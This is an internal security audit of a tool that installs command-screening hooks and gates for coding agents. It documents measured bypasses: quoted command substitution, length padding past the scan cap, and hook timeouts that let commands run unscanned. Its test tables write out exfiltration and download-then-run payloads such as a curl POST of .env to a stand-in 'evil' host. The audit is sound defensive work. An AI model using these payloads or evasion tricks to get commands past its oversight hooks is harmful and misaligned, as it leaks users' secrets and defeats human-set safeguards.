# Production-readiness analysis — `main`

**Subject:** `main` @ **053a367** (re-based 2026-08-13; the layers below were
written against `560588c` and earlier) · **Baseline:** annotated tag `v2.7.4` →
`d884a43`, which is where this analysis started and against which every delta
below is measured.

**SUBJECT NOTE, 2026-08-14 — `main` has moved; nothing below is re-measured.**
`main` is now **`0d4d5af` = annotated tag `v2.8.0`** (PR #66 `3af0c11` — the
X-52 docs line, and NOT docs-only: per its merge diff, this document's RE-BASE
block, the security KB, the threat-model draft and the backlog threat-model
re-sort, PLUS the fail-open retraction's sweep through four `lib/` files —
including the installer's runtime warning string, an executable f-string —
with golden digests re-baselined under freeze exception no. 67; then PR #67,
the v2.8.0 LIT literature fold). Re-derived on `0d4d5af` today:
**C-1** — `git ls-files | grep -icE 'licen[cs]e'` → **0**, so **v2.8.0 is a
second tagged release with no LICENSE** and the verdict cannot have moved; for
the first time since v2.7.4, "not production ready" attaches to an *adoptable*
tag that ships item 1, B4/X-45..X-51, the X-52 line and the LIT fold, with no
legal grant to adopt any of it — §9's "no external adopter can obtain" is
overtaken in exactly this sense. **Backlog rows `open` = 105**, unchanged from
`053a367` by the same validated rule (re-validated at 88 on v2.7.4); suite
**25 / 9,668 / 0**; differential **4,104**; X-54/X-55 still `open` (X-54's own
row now records **159.52 s** post-memo, 2.7× past the ceiling). The LIT fold
moves no gate mechanism — emitted `gates.py` AST-identical across
`053a367..0d4d5af` (`f71ec4a81bae9f826e39d06f361dac5f`), all 11 hook bodies
identical comment-stripped, settings delta = the `_generatedBy` stamp — so no
C-row, no §2 class and no cost figure below is re-measured by it. Its one
behavioral change, LIT-07, binds the operator-COMPLETED loop — the emitted
skeleton still dispatches nothing, so C-2 stands — and its migration is a
hand-edit the digest guard deliberately skips: **on existing installs the new
binding item is unenforced by construction.** LIT-06's golden-task harness and
LIT-02's consolidation gate run through the autonomous modes C-2 records as
dispatching nothing — the gap C-2 describes gains dependents, not
contradictions.

**How to read this document.** It is layered, oldest evidence at the bottom,
and the layering is deliberate — nothing that was measured is deleted when it
stops being current, because a finding that *was* true is the only way to show
what a change actually bought.

| layer | subject | status |
|---|---|---|
| **RE-BASE** (below) | `main` @ **053a367** | **current as of 2026-08-13; see SUBJECT NOTE above** |
| HISTORY — SUPERSEDED ASSESSMENT | `main` @ 560588c | superseded by PR #64 and PR #65; retained as evidence, **not re-measured** |
| HISTORY — REVISION 1 | branch `fix/item1-…` @ e47d827 | superseded, retained as evidence |
| HISTORY — §§0–9 (2026-08-08) | tag `v2.7.4` @ d884a43 | superseded **as a description of `main`**; still exactly true of the tag |

**§§0–9 were written about the TAG.** Where a finding was re-measured later it
carries a **STILL TRUE @ …** or **CHANGED @ …** marker in place; where it does
not, read it as a tag finding whose current status is given in the assessment
above. **No tag finding has been retracted** — the tag has not moved.

**Method, unchanged across all three passes so the numbers stay comparable:**
a stock install from the repo's own `bootstrap.config.yaml` (`approved: []`,
archetype `service`) giving 5 SDK gates / 11 shell hooks, with a **positive
control on every gate before any `allow` is believed**, and execution proof — a
canary `.env` and fake binaries on `PATH` writing a marker — wherever the claim
is that something *runs* rather than merely that it is permitted.

**Original method (2026-08-08):** 8-agent fan-out — six independent evidence
lenses, then two advocates arguing opposite verdicts on the same dossier. Every
headline claim re-verified by the author against a fresh `git archive v2.7.4`
install.

---

## RE-BASE — `main` @ `053a367` · 2026-08-13

> **READ THIS BEFORE THE SECTION BELOW IT.** Everything under "SUPERSEDED — `main` @ 560588c" is **superseded by two merges** — PR #64
> (`d20860b`) and PR #65 (`053a367`) — and is retained as evidence, not as a
> description of `main`. It has not been re-measured. Where it and this block
> disagree, this block is current.

**THE VERDICT DOES NOT CHANGE: `main` is not production ready.** C-1 alone
settles it and is untouched by either merge — `git ls-files | grep -icE
'^LICENSE|/LICENSE'` returns **0** on `053a367`, re-run today. No amount of gate
work moves a verdict a missing legal grant already decides.

**But one of the verdict's two supporting legs got WORSE, and this document was
arguing it backwards.** The section below books the cost class as an
availability problem — an over-denial, a performance footnote, "far inside the
ceiling … and it is not a defect". That premise is **inverted**. X-51 established
live against Claude Code that a `PreToolUse` hook cancelled at its declared
`timeout` exits 124/137/143, that only exit **2** blocks, and that the tool call
therefore **proceeds**. Crossing the ceiling is not a refused benign command; it
is **the gate being skipped and the command running unscanned**. Every sentence
below that treats cost as latency describes a bypass while calling it an
over-denial. The mechanism and the two sound postures are in
`docs/agentic-harness-security-kb.md` §4.11.

**What #65 bought, and what it did not.** It removed a real token-count
quadratic: the `"! " × 40000 + pip install evilpkg` shape went from a 139.58 s
bypass to a deny in seconds. It did **not** close the class. X-54 and X-55 are
`open`, fail-open, execution-relevant and **pre-existing** — measured at
`bbf6434` and on `main`, neither introduced nor closed by #65. A wrapper head
(`sudo`) plus 2000 quoted runs sits inside both shipped caps and still crosses
the 60 s ceiling. Getting there cost six self-inflicted regressions, five of them
fail-open, one of which (`b1fcc85`) was a live dependency-gate bypass that
reached `origin` inside an open, mergeable PR and survived every check this repo
has.

**Counts, re-derived today by this document's own stated rule** (first backticked
legend token in the row's last cell). The rule was validated before use: it
reproduces the tag's **88** exactly.

| | tag `v2.7.4` | `6f77ccc` | `560588c` | `d20860b` | **`053a367`** |
|---|---|---|---|---|---|
| backlog rows `open` | 88 | 88 | 94 | 100 | **105** |
| suite checks | — | — | 9,601 | — | **9,668 / 0 (25 files)** |
| `test_substrate_differential.py` rows | — | — | 4,051 | — | **4,104** |

One correction that follows from that table, and one clarification. §5's "**93**
`open`" was **never a `main` figure** — §5 says so plainly: the rule "reproduces
… against `main` (88), and returns **93** on the branch", i.e. 93 counts
`fix/item1-…` @ `e47d827`. That branch measurement was correct and is not being
retracted. What *is* stale is the `main` half beside it: 88 was true at
`6f77ccc`, but by `560588c` — the commit this document names as its own subject —
`main` was already at 94. And the count has risen
across two merges that each *closed* holes, because closing a hole here reliably
files its residuals: X-52 is `done` and filed X-53 … X-58 doing it.

**WHAT IS NOT RE-MEASURED, STATED SO IT IS NOT MISTAKEN FOR CURRENT.** Every
wall-clock figure below — the Csq table, the 0.16 → 7.64 s comparison, the
"~48× slower" line, the per-head-class ratios — was taken on `560588c` or
earlier, before B3 re-landed and before the X-52 lazy walk and per-segment memo
existed. **A fresh head-class cost measurement on `053a367` is owed and has not
been run.** It is owed in the backlog and in the security KB, and it is not
claimed anywhere. Do not quote a cost number from the section below as a
statement about `main`.

---

## SUPERSEDED — `main` @ 560588c · 2026-08-10

**PR #62 merged.** `main` moved `6f77ccc` → **`560588c`**, and for the first
time the item-1 work is *in* `main`. This revision therefore answers a
different question from the two passes below it: **not "can you pin the tag" but "what
is true of `main` today".** Tag findings are untouched — `d884a43` has still
not moved, and every verdict about *the tag* stands.

| marker | meaning |
|---|---|
| **STILL TRUE @ main** | re-measured on `main` @ 560588c, unchanged |
| **CHANGED @ main** | no longer true of `main`, or true with a narrower scope |

**Method:** the same stock install both earlier passes used — the repo's own
`bootstrap.config.yaml` (`approved: []`, archetype `service`), giving **5 SDK
gates / 11 shell hooks**, exactly the "stock" row of K-2's table in §3. A
different config would silently rescope every finding. **Positive control
first on every gate used**: `cat .env` → DENY/DENY and `pip install evil` →
DENY/DENY on the same install, before any `allow` below was believed. Three
trees measured back to back: `git archive v2.7.4^{commit}`, `git archive
e47d827` (the previous revision's subject) and `main`.

**THE VERDICT DOES NOT CHANGE. `main` is not production ready.** C-1 alone
settles it — there is still no LICENSE, so there is no legal grant to adopt —
and C-3, C-5 and C-6 are untouched. What changed is *which* of §2's rows are
open, and one cost regression that was introduced and then paid back.

### What `main` actually does now — MEASURED

| | tag `d884a43` | branch `e47d827` | **`main` 560588c** |
|---|---|---|---|
| §2 Class A — read, install, exfil | ALLOW/ALLOW | DENY/DENY | **DENY/DENY** |
| §2 Class A + 8,300 B padding | ALLOW/ALLOW | ALLOW/ALLOW | **ALLOW/ALLOW** — B3 **parked**, X-44 open |
| §2 Class B (`bash -c "$(curl …)"`) | ALLOW/ALLOW | ALLOW/ALLOW | **ALLOW/ALLOW** — X-37 open |
| Csq* 6,010 B — shell wall clock | 0.16 s | **65.08 s** | **7.64 s** |
| Csq* 9,010 B — shell wall clock | 0.29 s | **158.65 s** | **13.23 s** |
| suite | 9,416 / 0 (24 files) | 9,568 / 0 | **9,601 / 0 (25 files)** |
| `test_substrate_differential.py` | 3,926 | 4,028 | **4,051** |

*\* `Csq` = a **q**uote-dense **c**ommand **s**ubstitution — `echo "$(` followed by dense `'('` and a closing `)"`. It is the shape the 60 s crossing below lives on, and the one B3 was later parked over.*

### The one genuinely new thing: a fail-OPEN crossing that item 1 INTRODUCED

> **[Corrected 2026-08-13, X-51 — the heading and the paragraph below said
> fail-CLOSED, which is the unsafe inversion.]** This subsection originally read
> "a fail-closed crossing … and `main` has since paid back", and asserted that
> **a hook that runs long is a DENY the operator cannot override**. That is
> exactly backwards. `FAIL_CLOSED=1` governs what the hook does on *its own*
> error; it says nothing about the harness killing it. A hook cancelled at its
> declared `timeout` exits 124/137/143, only exit **2** blocks a `PreToolUse`
> call, and so the call **PROCEEDS**: the crossing is a **BYPASS**, not an
> over-denial. Verified live against Claude Code. The original text is kept
> below because the *measurements* in it are real and still show what the change
> cost — only their security direction was wrong. Read every "over-denial" in
> this subsection as "the gate is skipped and the command runs unscanned".

This is the finding worth carrying, and neither earlier pass could state it,
because it did not exist at the tag and was not yet fixed on the branch.

`dependency-gate` is emitted with `timeout: 60` and `FAIL_CLOSED=1`
(`dependency-gate.sh:41`, verified on `main`'s stock install), so **a hook
that runs long is a DENY the operator cannot override** *(retracted — see the
correction above; it is an ALLOW nobody chose)*. On a 6,010-byte
quote-dense substitution the shell took **0.16 s at the tag** and **65.08 s at
`e47d827`** — past that ceiling, while the SDK completed and allowed. Item 1
bought Class A closure at the price of a benign-input over-denial *and* a
substrate split. **`main` takes it to 7.64 s**: comfortably inside, both
substrates allow, the split is gone.

Two commits did that, and both are in the merge: **B4** (`b0d30fc`) bounded
the walk's per-delimiter cost with a front window, and **X-45** (`5969fa9`)
found that B4 had *not* closed the crossing and that the cost was never the
walk at all — `_cs_isinv`, called once per quoted run, used two `##`-with-
leading-`*` expansions, which are quadratic in bash (0.044 s at 1 KB → 10.25 s
at 16 KB). Three further gates were carrying the same defect unattributed
(test-gate, eval-gate, ci-mirror, each 30.4 → 3.5 s).

**State it honestly both ways:** against the tag, `main` is still **~48×
slower** on this shape (0.16 → 7.64 s). That is the standing price of walking
into substitutions at all. It is far inside the ceiling, and it is not a
defect — but it is not free either, and the next person raising any bound in
this area needs to know the headroom is finite.

> **[Corrected 2026-08-13.]** Two things above are no longer true of `main`.
> **(1) "Far inside the ceiling … not a defect" is retracted.** Cost here is an
> open, fail-open bypass class, not headroom: X-54 measures a wrapper head plus
> 2000 quoted runs — inside *both* shipped caps — over the 60 s ceiling on
> `main` and on the fix alike, and its quote-free sibling crosses with no
> quoting and zero jump targets. Both X-54 and X-55 are `open` and
> **pre-existing**. **(2) The 0.16 → 7.64 s pair is a `560588c` measurement**
> and has not been re-taken; the cost path has changed five times since (X-36y's
> window, B3's re-land, X-50's quadratics, X-51's guard, X-52's lazy walk and
> memo). The "headroom is finite" instinct in the last clause was right — it was
> just measuring the wrong quantity.

### Everything else — why C-1 … C-8 cannot have moved, and the check that proves it

**The entire code delta from the previous revision's subject to `main` is two
shell-only cost commits in ONE file.** `git diff e47d827..main -- lib/` is
`lib/templates.py` only, and **`lib/sdk_gates_template.py` is BYTE-IDENTICAL**
across that range — so the SDK substrate is exactly what REVISION 1 measured,
and no C-row's mechanism was touched. Spot-verified directly rather than
inferred: **C-1** — `git ls-tree -r --name-only main | grep -icE 'licen[cs]e'`
→ **0**, no LICENSE at tag, at `main`, or anywhere; **C-7** — `import
claude_agent_sdk` → `ModuleNotFoundError` on `main`. **C-2 … C-6 and C-8 are
STILL TRUE @ main** on that basis.

**Backlog rows carrying `open`** (counted as `grep -c '`open`'`, which is a
looser pattern than the 88/93 figures elsewhere in this document — the *delta*
is the comparable quantity, not the base): tag **93** → `e47d827` **98** →
`main` **101**. It went UP across a merge that closed a hole, for the same
reason §4 already gives: closing §2 could never decrement it, while the review
rounds that closed it filed new rows.

### What the merge did NOT do, stated plainly

* **B3 is not in `main`.** It was built, went green at 9,621 / 0 with 4,073
  differential rows, and was **parked** at `wip/b3-flat-budget` (`395b955`)
  after adversarial review of the diff found its cost backstop turns benign
  lift-heavy commands into unoverridable denies (the same 60 s ceiling as
  above: 15.75 s → **85.14 s** at 20.5 KB). Its design is validated and
  re-usable; its precondition is **X-36y**. So **§2.2's padding bypass is
  still open on `main` exactly as written**, and the fix for it is further
  away than §8 implied, not closer.
* **Class B / X-37 is untouched.**
* **None of §8's items 2–8 has been done.**

---
> ## HISTORY — REVISION 1 · 2026-08-09 · subject: branch `e47d827`
>
> **This is an update, not a rewrite.** The subject of the original analysis —
> annotated tag `v2.7.4` → `d884a43` — **has not moved**, and every verdict
> below about *the tag* still stands exactly as written on 2026-08-08. Nothing
> here retracts a tag finding.
>
> **What is new:** work has landed on the unpushed branch
> `fix/item1-dquote-command-substitution` @ **e47d827** (`main` is still
> `6f77ccc`, untouched). This revision re-measures the document against that
> branch and records three kinds of change, each marked in place:
>
> | marker | meaning |
> |---|---|
> | **STILL TRUE @ e47d827** | re-measured on the branch, unchanged |
> | **CHANGED @ e47d827** | still true of the tag, no longer true of the branch, or true with a narrower scope |
> | **CORRECTION** | this document was *wrong on 2026-08-08* — the error reproduces identically on a `git archive v2.7.4` install, so it is a misstatement here, not a regression |
>
> **Method of this revision:** three-lens fan-out (blocking finding, critical
> findings, backlog) against two STOCK installs built from the repo's own
> byte-identical `bootstrap.config.yaml` (`approved: []`, archetype `service`,
> `create=57 rc=0`) — one from `git archive v2.7.4`, one from the branch
> working tree — plus a real-`bash` execution probe with a canary `.env` and
> fake `pip`/`npm`/`curl`/`cat` on `PATH`. Every `allow` reported below was
> taken with a **positive control** first, showing the same gate stack CAN
> deny on the same install.
>
> **The one-line answer:** the verdict is unchanged for the tag, and unchanged
> for the branch. §2's headline hole is **three-quarters closed on the branch
> and not closed**: Class A is walked by both substrates now, but Class B
> (`bash -c "$(curl …)"`) still executes a real remote payload, and **~8 KB of
> ordinary padding reverts every closed row to allow/allow on both substrates
> with the canary measurably exfiltrated**. None of C-1 … C-8 has been fixed.

---


## 0. Evidence labels

**MEASURED** = executed in a throwaway install from the tag archive, with a
file marker written by a fake binary on `PATH` where execution (not merely
permission) is the claim. **READ** = located in a file, not executed.
Everything decisive below is MEASURED, and the author independently reproduced
the blocking finding rather than inheriting it.

*(2026-08-09: the same convention governs the revision. Additionally, no number
carried over from the 2026-08-08 pass was inherited — each was recomputed from
its source of truth, and where it moved, both the old and the new value are
given. Where a re-measurement disagrees with the original text, the
disagreement is labelled **CORRECTION** only after checking that it reproduces
on a `git archive v2.7.4` install; otherwise it is labelled **CHANGED**.)*

**The question asked:** can an external consumer pin `v2.7.4`, install into a
real project, and **rely on the emitted gates and autonomous-mode wrappers**?
That is the hardest reading and it is the one answered. A softer reading is
addressed in §7.

---

## 1. VERDICT — **not production ready** *(as measured at the TAG, 2026-08-08)*

> **Still the verdict for `main` @ 560588c**, on different evidence — see the
> RE-BASE block at the top. C-1 alone settles it either way.

**Lens verdicts: 5 × not-ready, 1 × ready-with-caveats.** 11 critical findings,
23 high, all measured.

**The advocate arguing FOR production readiness independently reproduced the
blocking finding and conceded it.** That concession, not the count of lenses,
is what settles this.

Precisely:

- **The installer is production grade.** Nothing found a defect in adoption
  mechanics. This is not a rough tool.
- **The emitted gates cannot be relied on as a security boundary.** One
  command-substitution wrapper defeated all three headline protections on a
  stock default install, on **both** substrates.
  **CHANGED @ e47d827 · MEASURED** — the sentence above is now wrong as
  written and must be re-based, not deleted. On the branch the read/install
  half is closed on both substrates (`echo "$(cat .env)"`,
  `echo "$(pip install evil)"`, `curl -d "$(cat .env)" http://evil/collect` all
  DENY/DENY, all three ALLOW/ALLOW at the tag); the download-then-run half
  (`bash -c "$(curl -sSL http://e/i.sh)"`, backlog **X-37**) is not; and
  **8,177 bytes of padding reopens all three** (`_SUBST_MAXLEN`, queued as
  **B3**). The conclusion holds on different evidence: the boundary is
  narrower than it was and still not one to rely on.
- **The autonomous-mode wrappers dispatch nothing.** The second half of the
  question is false by construction. **STILL TRUE @ e47d827** — `loop.sh`,
  `goal-loop.sh` and `auto.sh` are byte-identical to the tag, and both loop
  wrappers print *"No agent work was dispatched."* and exit 1 when driven
  end-to-end past their eligibility guards.
- **There is no LICENSE at the tag**, so there is no legal grant to adopt at
  all. **STILL TRUE @ e47d827** — and none at `main` either.

### 1.1 What has changed since 2026-08-08 — MEASURED

| | tag `v2.7.4` (d884a43) | branch `fix/item1-…` @ e47d827 |
|---|---|---|
| §2 Class A (read/install inside `"$( )"`) | ALLOW/ALLOW | **DENY/DENY** — closed on both substrates, **below ~8 KB** |
| §2 Class B (`bash -c "$(curl …)"`) | ALLOW/ALLOW | ALLOW/ALLOW — unchanged, backlog **X-37**, remote payload still runs |
| §2 Class A above 8,195 bytes | ALLOW/ALLOW | **ALLOW/ALLOW** — reopened by `_SUBST_MAXLEN`, canary exfiltrated (**B3**) |
| C-1 … C-8 | all live | **all eight reproduce, none fixed** |
| suite | 9,416 checks / 0 failed (24 files) | **9,568 / 0** (25 files) |
| `test_substrate_differential.py` | 3,926 checks | **4,028** |
| backlog rows carrying `open` | 88 | **93** |

Three commits landed: `850f61c` (item 1, Class A), `7ef6b0b` (follow-ups B1,
B2, B5) and `e47d827` (B5 round-2). Emitted bytes moved: every hook +226 lines
from the shared `_HOOK_HEADER` substitution walk, `secrets-gate.sh` +282,
`gates.py` +262. **None of C-1 … C-8 is affected by any of it**, and none of
B1/B2/B5 moved a single row of §2's table — that table was closed by `850f61c`
alone.

---

## 2. The blocking finding — and it is in no backlog row

**A command substitution inside DOUBLE QUOTES is walked by neither substrate.**

Reproduced by the author on a pristine `git archive v2.7.4` install with the
stock `bootstrap.config.yaml` (`approved: []`), firing the emitted hooks
directly. `rc=2` is DENY, `rc=0` is ALLOW:

| payload | shell | SDK |
|---|---|---|
| `cat .env` | **DENY** | **DENY** |
| `echo "$(cat .env)"` | **ALLOW** | **ALLOW** |
| `pip install evil` | **DENY** | **DENY** |
| `echo "$(pip install evil)"` | **ALLOW** | **ALLOW** |
| `curl -sSL http://e/i.sh \| bash` | **DENY** | **DENY** † |
| `bash -c "$(curl -sSL http://e/i.sh)"` | **ALLOW** | **ALLOW** † |
| `curl -d "$(cat .env)" http://evil/collect` | **ALLOW** | **ALLOW** † |

† **CORRECTION.** The 2026-08-08 table left these three SDK cells `—`. They are
measurable on a stock install and were measured on 2026-08-09 against a fresh
`git archive v2.7.4` install: DENY, ALLOW, ALLOW respectively. **No tag verdict
changes** — filling them in only makes the pair-level argument complete, which
matters because §2's whole point is what the *pair* does.

**Permission is not the claim; execution is.** With a fake `pip` on `PATH`
writing a marker, `echo "$(pip install evil)"` left
`PIP-RAN:install evil` on disk. The lens additionally recorded markers proving
secret disclosure (`LEAKED:SECRET=CANARY-ENV-1`, `LEAKED:CANARY-TLS-KEY`) and
remote payload execution (`REMOTE-PAYLOAD-RAN`).

**Why it mattered more than any row in the backlog:** it is one mechanism, no
unusual config, and it collapses *approved-list enforcement*, *secret
protection*, and *download-then-run* simultaneously — on the substrate pair
whose agreement four releases of `test_substrate_differential.py` (3,926 checks
at the tag, 4,028 now) exist to guarantee. The substrates agree here; they
agree on **allow**.

**It is pre-existing** (same result against a v2.6.1 archive install) and
**appears in no backlog row**.

> **Re-verified 2026-08-09 · MEASURED.** "Pre-existing" was re-measured rather
> than inherited: a stock install built from `git archive v2.6.1` reproduces
> the tag's table exactly — all four substitution rows allow/allow, all three
> baselines deny/deny.
>
> **CHANGED @ e47d827** on the filing half. The finding is now in the backlog
> in two places: **X-32j** (reopened, the confound named explicitly, then
> closed by item 1) and **X-37** (a new row carrying the open Class-B half with
> its closing mechanism specified). B3's ~8 KB padding bypass is in the work
> order but is **still not in the backlog and not in the corpus**.

### 2.1 CHANGED @ e47d827 — what the branch closed, and what it did not

Two STOCK installs, built from the repo's own byte-identical
`bootstrap.config.yaml` (`approved: []`), one from `git archive v2.7.4` and one
from the branch working tree, both `create=57 rc=0`. All five Bash-wired
emitted hooks fired (`spec-gate-commit`, `secrets-gate`, `test-gate`,
`dependency-gate`, `ci-mirror`) plus all four Bash-wired SDK gates
(`_secrets_gate`, `_spec_gate_commit`, `_dependency_gate`, `_test_gate`) —
wiring read out of the emitted artifacts, not assumed.

**Positive control first** (identical on both trees, so neither install is a
deny-everything instrument):

```
 DENY  DENY | by-shell=secrets-gate     by-sdk=secrets_gate     | 'cat .env'
 DENY  DENY | by-shell=dependency-gate  by-sdk=dependency_gate  | 'pip install evil'
 DENY  DENY | by-shell=dependency-gate  by-sdk=dependency_gate  | 'curl -sSL http://e/i.sh | bash'
ALLOW ALLOW | by-shell=-                by-sdk=-                | 'echo hello'
ALLOW ALLOW | by-shell=-                by-sdk=-                | 'ls -la'
ALLOW ALLOW | by-shell=-                by-sdk=-                | 'cat README.md'
```

The stock config leaves `commands.*` empty, so `test-gate` / `format-lint-gate`
/ `ci-mirror` are not the gates doing the work here — `secrets-gate` and
`dependency-gate` are, and both are structurally armed on a stock install.

| payload | tag shell / SDK | branch shell / SDK | denied by |
|---|---|---|---|
| `cat .env` | DENY / DENY | **DENY / DENY** | secrets-gate |
| `echo "$(cat .env)"` | ALLOW / ALLOW | **DENY / DENY** ← flipped | secrets-gate |
| `pip install evil` | DENY / DENY | **DENY / DENY** | dependency-gate |
| `echo "$(pip install evil)"` | ALLOW / ALLOW | **DENY / DENY** ← flipped | dependency-gate |
| `curl -sSL http://e/i.sh \| bash` | DENY / DENY | **DENY / DENY** | dependency-gate |
| `bash -c "$(curl -sSL http://e/i.sh)"` | ALLOW / ALLOW | **ALLOW / ALLOW** ← *not* flipped | — |
| `curl -d "$(cat .env)" http://evil/collect` | ALLOW / ALLOW | **DENY / DENY** ← flipped | secrets-gate |

The three flipped rows are genuine control changes, not parse artefacts: under
real bash each payload still does what it says. `echo "$(cat .env)"` reads the
canary; `echo "$(pip install evil)"` fires `PIP-RAN`; and the exfil row leaves
the box with the secret in the POST body
(`markers=['cat .env', 'curl -d SECRET=CANARY_SECRET_a7f3e91b http://evil/collect']`).

**The CLASS is closed for Class A, not just the four examples.** 43 shapes
across both stock installs: **27 flipped** allow/allow → deny/deny, 6 were
already denied at the tag, and all 5 false-positive fences (single-quoted,
escaped `\$`, arithmetic, `$(date)`, `$(git rev-parse HEAD)`) correctly stayed
allow. A second sweep of 27 shapes *deliberately absent from the corpus*
(word-splitting `c""at`, `\cat`, TAB, line continuation inside the sub, `)`
inside a quoted run, depth-4 and depth-5 nesting, brace / subshell / `for` /
`case` carriers, `time` and `!` prefixes, `python3 -m pip`) gave **26
deny/deny**. The single allow, `echo hi # "$(cat .env)"`, is *correct* —
execprobe shows bash runs nothing there.

### 2.2 CHANGED @ e47d827 — the closure is length-bounded (B3)

`_SUBST_MAXLEN = 8192` truncates the segment **before** the walk on both
substrates, so a substitution whose closing paren lands past byte 8192 is
silently dropped and fails **open**:

**UPDATE 2026-08-09: a fix for this was built, measured and REVERTED** (backlog **X-44**). Replacing the prefix cap with a delimiter budget did close the padding bypass, but it recreated the two-denominator split on the SDK side (which budgets per segment and per token, not per command), it hid a substitution at byte 5006 behind a `}` run plus trailing padding — inside the 8192 bytes the old cap guaranteed were walked — and it pushed three shapes that previously returned `allow` in ~50 s across the 60 s fail-closed ceiling. The measurement that matters for planning: the shell's per-delimiter cost is O(remaining bytes), so **no bound of this shape works until that is fixed** — a flat budget large enough to keep the ~8 KB floor costs 87.6 s on 128 KB, and a length-scaled one splits the substrates. §8's exhaustion item therefore has to come first. The hole below is still open and still measured exactly as written.

```
$ grep -n _SUBST_MAXLEN <stock branch install>/.claude/hooks/secrets-gate.sh
751:_SUBST_MAXLEN=8192
814:  _s="${_s:0:$_SUBST_MAXLEN}"
$ grep -n _SUBST_MAXLEN <stock branch install>/.claude/sdk_gates/gates.py
587:_SUBST_MAXLEN = 8192
1072:    seg = seg[:_SUBST_MAXLEN]
```

The cliff is exact — 8,176 bytes of padding still denies, **8,177 allows**
(total command 8,195 B) — and at that padding **all three flipped rows revert
to allow/allow on both substrates and still execute**, canary exfiltrated for
real:

```
ALLOW ALLOW | pad8177 secret read   'echo "X…X$(cat .env)"'
ALLOW ALLOW | pad8177 pip install   'echo "X…X$(pip install evil)"'
ALLOW ALLOW | pad8177 exfil         'curl -d "X…X$(cat .env)" http://evil/collect'
rc=0  markers=['cat .env', 'curl -d X…XSECRET=CANARY_SECRET_a7f3e91b http://evil/collect']
```

The bound is **positional, not global** — a per-segment prefix. A substitution
*before* the cut still denies; one *after* it allows; and
`echo "<20k pad>"; echo "$(cat .env)"` is shell **ALLOW** / SDK **DENY**, a
live substrate divergence.

This is the queued **B3**, not a new discovery. It is recorded here because it
is the reason §1's verdict cannot be softened on the strength of item 1 alone:
**the headline hole is not fully closed even on the branch.**

### 2.3 CHANGED @ e47d827 — Class B is still open, and still executes

`bash -c "$(curl -sSL http://e/i.sh)"` is ALLOW/ALLOW at the tag *and* on the
branch. With a fake `curl` serving a real script, the remote payload runs:

```
$ PATH=box/bin:$PATH bash -c 'cd work && bash -c "$(curl -sSL http://e/i.sh)"'
--- rc=0 ---
MARKERS:  curl -sSL http://e/i.sh / REMOTE-PAYLOAD-RAN / LEAKED:SECRET=CANARY-ENV-1
```

This is Class B / backlog **X-37**, deliberately ledgered `allow` in the
differential corpus. Reported here as confirmation that the tag's row is still
accurate, not as a discovery.

### Why 9,462 green checks missed it — and what pins it now

**CORRECTION on the number.** 9,462 was `main` @ 6f77ccc, **not the tag**.
Re-derived by running every `tests/test_*.py` in three trees:

| tree | files | checks |
|---|---|---|
| tag `v2.7.4` (d884a43) | 24 | **9,416** passed / 0 failed |
| `main` (6f77ccc) | 25 | 9,462 (see note) |
| branch (e47d827) | 25 | **9,568** passed / **0** failed |

*(Note: the `main` run from a `git archive` extraction reports 9,460 passed +
2 failed; both failures are extraction artefacts — `test_doc_citations.py`
cannot run without a git index and reports `git ls-files returned a file list:
got 0 files` — and the same file passes 34/34 in a real checkout, so main's
real figure is 9,462 and the original number reconciles exactly.)*

The suite's only coverage of the `"$(cat .env)"` carrier
(`tests/test_substrate_differential.py:2304` *[@ v2.8.0 the corrected row is
at `:2443`]*) always pairs it with
`rg -g '!*.pem'` — which denies on the **glob token alone**. `rg foo "$(cat .env)"`
allows. Backlog row **X-32j** cites that exact `rg` command as proof the
substitution veto works.

That is this project's own **X-36p** failure mode — *a control that agrees for
the wrong reason* — sitting unrecognised inside the corpus written to detect it.
**Fix the corpus row before fixing the code, or the fix will not be pinned.**

> **CHANGED @ e47d827 · MEASURED — this was done, and the pin is verified by
> falsification rather than by a green run.**
>
> - The AXIS 9d row is corrected **in place**, relabelled *"glob-token deny
>   holds w/ trailing sub"* with the confound spelled out in the comment.
> - **X-32j** was reopened, the confound named, and re-closed.
> - It is no longer the suite's only coverage: a **95-row `_DQCS` section** at
>   `tests/test_substrate_differential.py:3042` *[@ v2.8.0: `:3188`]* measures the carrier
>   unconfounded, including the exact probe this document proposed —
>   `rg foo "$(cat .env)"`, ALLOW/ALLOW at the tag, **DENY/DENY** now (and
>   under real bash the secret really is read: `rc=2 markers=['cat .env']
>   err='rg: SECRET=CANARY_SECRET_a7f3e91b: IO error…'`).
> - **The corpus can signal.** Neutering both walkers in a scratch copy (SDK
>   `_subst_inners` → `return []`; shell `_cs_subst_scan` →
>   `_CS_SUBST_R=""; return 0`) drops the differential from **4,028 / 0** to
>   **3,971 passed / 57 failed**, and 55 of the 57 land in the new
>   double-quoted-substitution section. It is a pin, not an agreement.
> - Of the 95 `_DQCS` rows fired against both stock installs: **52** were
>   allow/allow at the tag and are deny/deny now, **0** rows the corpus wants
>   denied are allowed, and there are **0** shell/SDK divergences on the branch.
>
> **A finding the four-row table above could not show:** at the tag those 95
> shapes were *not* uniformly in agreement — 3 dependency-gate rows were shell
> DENY / SDK ALLOW. So the tag was slightly worse than "they agree on allow";
> the branch has 0 divergences on the same 95 — but agreement returns at
> length, and one padded shape diverges shell-ALLOW / SDK-DENY (B3, above).

---

## 3. The other critical findings (all measured)

**All eight reproduce at `e47d827`.** Where attribution mattered, each was
re-run against a stock `git archive v2.7.4` install and gave identical results:
the item-1 / B1 / B2 / B5 work touched every emitted hook without moving any of
them. Two rows below carry a **CORRECTION** — both were wrong on 2026-08-08 and
both reproduce identically at the tag, so they are misstatements in this
document, not regressions.

| # | Finding | Note |
|---|---|---|
| C-1 | **No LICENSE at tag `v2.7.4` — nor anywhere since** | **STILL TRUE @ e47d827.** Re-verified 2026-08-09: `git ls-tree -r --name-only` finds no `LICEN[CS]E` at the tag, at `main` (6f77ccc), or at the branch (e47d827); README carries no license statement either. Exactly two tracked files were added after the tag (`docs/production-readiness.md` — then named `production-readiness-v2-7-4.md` — and `tests/test_doc_citations.py`). A public repo with no legal grant to adopt. Cheapest fix here, and a hard blocker. |
| C-2 | **Autonomous-mode wrappers dispatch nothing** | **STILL TRUE @ e47d827**, with a count correction. `loop.sh`, `goal-loop.sh` and `auto.sh` are byte-identical to the tag. `loop.sh` has 8 `claude -p` occurrences — **6 in comments, 2 in `echo … >&2` advisories** — and `goal-loop.sh` has 10 — **8 in comments, 2 in advisories**: four non-comment occurrences in total, all echoes (the original said two). `loop.sh:3` reads *"SKELETON: the claude -p iteration loop is intentionally unimplemented"*. Driven end-to-end past the eligibility guards with a `loop_eligible: true` task, `loop.sh` prints *"No agent work was dispatched."* and exits 1; `goal-loop.sh` does the same. |
